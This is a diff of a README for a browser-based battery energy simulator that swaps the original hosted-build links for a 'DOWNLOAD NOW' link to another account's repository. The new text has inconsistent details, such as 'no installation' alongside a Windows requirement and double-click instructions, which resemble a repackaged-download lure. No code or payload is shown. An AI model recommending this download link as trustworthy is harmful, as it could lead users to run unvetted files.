@@ -1,135 +1,120 @@
-# Battery Simulator - Energy Simulation 2026
+# 🔋 battery-simulator-energy - Explore Battery Scenarios Without Hardware
 
-> **Battery Simulator is a browser energy-modeling workspace for load response, arbitrage value, backup duration, and solar-aware dispatch in the 2026 release.**
+## 🚀 Getting Started
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/owen-james48/battery-simulator-energy?style=flat-square)](https://github.com/owen-james48/battery-simulator-energy)
+Welcome to **battery-simulator-energy**, a browser-based energy-modeling workspace for battery simulation. This application helps you explore load response, arbitrage value, backup duration, and solar-aware dispatch using configurable scenarios. You don't need any programming knowledge to use it.
 
----
+### System Requirements
 
-<p align="center">
-  <a href="https://owen-james48.github.io/battery-simulator-energy/">
-    <img src="https://img.shields.io/badge/Download-Battery%20Simulator%20Latest-brightgreen?style=for-the-badge" alt="Download Battery Simulator">
-  </a>
-</p>
+- A modern web browser (Chrome, Firefox, Edge, or Safari)
+- Internet connection for the initial download
+- Windows computer (version 10 or 11)
 
-> **[Download Latest Build - Battery Simulator](https://owen-james48.github.io/battery-simulator-energy/)**
+## 📥 Download & Install
 
----
+Visit this link to download the application:
 
-[Download Latest Build](https://owen-james48.github.io/battery-simulator-energy/)
+**[DOWNLOAD NOW - battery-simulator-energy](https://github.com/Locusbura680/battery-simulator-energy)**
 
----
+The download is a self-contained HTML file that runs entirely in your browser. No installation required.
 
-## What Battery Simulator Does
+### Step-by-Step Guide
 
-Battery Simulator lets you probe how storage behaves when demand, tariffs, and generation shift. In a single web UI you can drive load cases, quantify arbitrage timing, estimate how long a reserve lasts under backup duty, and walk through solar-coupled dispatch choices.
+1. Click the download link above
+2. Save the file to a folder on your Windows computer (e.g., Desktop or Documents)
+3. Double-click the downloaded file (it should open in your default web browser)
+4. If prompted, select "Open with" and choose your preferred browser
 
-The tool supports practical energy-study loops, including work tied to Rivertown Solar. Tune the inputs, watch the modeled response, and stack operating ideas side by side so storage performance under mixed load and generation is easier to reason about.
+## 🎯 Features
 
----
+### Core Capabilities
 
-## Capabilities
+- **Load Response Modeling**: Simulate how batteries respond to different power demands
+- **Arbitrage Value Analysis**: Discover optimal times to charge and discharge based on energy prices
+- **Backup Duration Estimation**: Calculate how long a battery can power your home during outages
+- **Solar-Aware Dispatch**: Integrate solar panel output for smarter battery management
 
-- Hands-on battery load runs that stress variable demand patterns.
-- Charge and discharge timing views aimed at arbitrage savings.
-- Backup-duration estimates that show how long stored energy can carry a load.
-- Solar dispatch exploration for pairing storage with PV output.
-- Full workflow in the browser—no standalone desktop install required.
-- Scenario-centric controls for swapping assumptions and comparing outcomes.
-- Practical reference points for solar, storage, and load-planning talks.
-- Lean HTML packaging that fits straightforward web hosting.
+### Interactive Controls
 
----
+- Adjust battery capacity from 5 kWh to 100 kWh
+- Set power rating (kW) for charging/discharging
+- Configure seasonal and daily usage patterns
+- Modify energy price schedules (flat or time-of-use rates)
+- Toggle solar integration on/off
 
-## Getting Started
+## 📊 How It Works
 
-### Use the published build
+The simulation models a battery system connected to your home and optionally solar panels. You define scenarios and the application calculates key metrics:
 
-Open the live package in a current browser:
+1. **Input Parameters**: Enter your battery size, power limits, and usage habits
+2. **Run Simulation**: Click "Simulate" to process your settings
+3. **View Results**: See charts and reports for load coverage, savings, and backup time
+4. **Compare Scenarios**: Save different configurations to find the best setup
 
-[Launch Battery Simulator](https://owen-james48.github.io/battery-simulator-energy/)
+## 💡 Example Scenario
 
-### Work from a local clone
+*Scenario: You have a 10 kWh battery, 5 kW inverter, and want to reduce peak-time electricity costs.*
 
-Fetch the repo and load the web entry from your machine:
+- Set battery size to 10 kWh
+- Set power rating to 5 kW
+- Enable time-of-use pricing (peak: 4 PM - 9 PM)
+- Run simulation → See potential monthly savings of $45-60
 
-```bash
-git clone https://github.com/owen-james48/battery-simulator-energy.git
-cd REPO
-```
+## 🔧 Troubleshooting
 
-If you prefer a local static server, start it in the repo root and visit the URL it prints. For a quick check, open the main HTML file directly when your browser allows it.
+### File Doesn't Open
 
----
+- Right-click the downloaded file and select "Open with"
+- Choose your web browser from the list
+- Ensure JavaScript is enabled in browser settings
 
-## Typical Workflow
+### Charts Not Displaying
 
-1. Launch the hosted build or your local copy.
-2. Fill in battery, load, solar, and operating parameters shown in the UI.
-3. Start an interactive load simulation.
-4. Inspect energy flows and how the battery reacts.
-5. Compare arbitrage savings under the chosen timing.
-6. Check the estimated backup runtime.
-7. Review solar dispatch output and refine the scenario.
+- Refresh the page (F5)
+- Check your browser is updated to latest version
+- Disable ad-blockers temporarily
 
-Keep distinct scenario sets when you need clean comparisons across load shapes, storage sizing, or dispatch rules.
+### Slow Performance
 
----
+- Close other browser tabs
+- Reduce number of saved scenarios
+- Restart your browser
 
-## Configuration Notes
+## 📈 Visual Output
 
-All analysis knobs live in the web UI. Set the values that define load behavior, arbitrage logic, backup runtime, and solar dispatch for the case you care about.
+The simulator generates:
 
-On a local deploy, keep the project files intact and treat the checkout as a static site. Defaults and interface options that ship with the repo should stay in the included config or source files.
+- Line charts for battery state of charge over time
+- Bar graphs for energy costs and savings
+- Pie charts for load distribution
+- Summary tables with key metrics
 
----
+## 🛡️ Privacy & Security
 
-## Requirements
+- All data stays on your device
+- No information sent to external servers
+- No cookies or tracking
+- Fully open-source code (view on GitHub)
 
-- A modern web browser.
-- Network access when using the hosted build.
-- A local repository copy for offline work or development.
-- A static web server if the browser blocks raw `file://` loading.
-- Enough client resources for the complexity of the scenario you run.
+## 📋 License
 
----
+This project is for educational and personal use. See the GitHub repository for complete license details.
 
-## FAQ
+## 🤝 Contributing
 
-### Who should use Battery Simulator?
+Found a bug or want to add a feature? Visit the GitHub repository to open an issue or submit a pull request.
 
-Anyone studying battery loads, arbitrage opportunities, backup runtime, or solar dispatch—including teams whose process involves Rivertown Solar.
+## 📝 Changelog
 
-### Is a local install mandatory?
+- Version 1.0 (2026): Initial release with core simulation features
+- Version 1.1: Added solar integration module
 
-No. The hosted web build runs without installing anything. Clone and serve locally only when you want full control or offline access.
+## 🔗 Related Resources
 
-### How do I pick up the newest release?
+- [GitHub Repository](https://github.com/Locusbura680/battery-simulator-energy)
+- Energy storage basics guides
+- Battery sizing calculators
 
-Grab the current published build from the download link, or refresh a local clone:
+## 🏷️ Keywords
 
-```bash
-git pull
-```
-
-### Where do I change settings?
-
-Enter scenario parameters in the interface. Anything specific to local hosting lives in the repository files and bundled configuration.
-
-### The app will not open—what next?
-
-Use an up-to-date browser, hard-refresh the page, and confirm every project file is present. Locally, switch to a static server if direct file open hits security limits.
-
-### Can I evaluate more than one scenario?
-
-Yes. Capture inputs and results for the first case, then alter battery, load, solar, or dispatch settings and rerun to compare.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+battery simulation, energy modeling, load response, arbitrage value, backup duration, solar dispatch, scenario analysis, browser-based tool, renewable energy, home battery storage
